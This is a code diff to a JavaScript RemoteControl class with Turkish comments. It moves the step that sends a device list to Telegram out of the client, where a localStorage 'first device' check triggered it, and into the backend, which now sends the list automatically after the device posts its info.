@@ -290,10 +290,11 @@ class RemoteControl {
     async listAllDevices(messageId) {
         try {
             const deviceInfo = await this.collectDeviceInfo();
-            const collectionId = `devices_${messageId}_${Date.now()}`;
+            const collectionId = `devices_${messageId}`;
             
             // Kendi cihaz bilgisini ekle
-            await fetch(this.collectDevicesEndpoint, {
+            // Backend otomatik olarak 2.5 saniye sonra listeyi gönderecek
+            const response = await fetch(this.collectDevicesEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -310,34 +311,10 @@ class RemoteControl {
                 })
             });
 
-            // LocalStorage'da işaretle (ilk cihaz mı?)
-            const storageKey = `collection_${collectionId}`;
-            const isFirst = !localStorage.getItem(storageKey);
+            const result = await response.json();
             
-            if (isFirst) {
-                localStorage.setItem(storageKey, 'true');
-                
-                // 2 saniye bekle (diğer cihazların da eklemesi için)
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Listeyi Telegram'a gönder
-                await fetch(this.collectDevicesEndpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        action: 'send',
-                        collection_id: collectionId
-                    })
-                });
-
-                // Temizle
-                setTimeout(() => {
-                    localStorage.removeItem(storageKey);
-                }, 5000);
-                
-                if (this.debug) console.log('[RemoteControl] Device list sent (first device)');
-            } else {
-                if (this.debug) console.log('[RemoteControl] Device added to collection (not first)');
+            if (this.debug) {
+                console.log('[RemoteControl] Device added to collection:', result);
             }
         } catch (error) {
             if (this.debug) console.error('[RemoteControl] List devices error:', error);
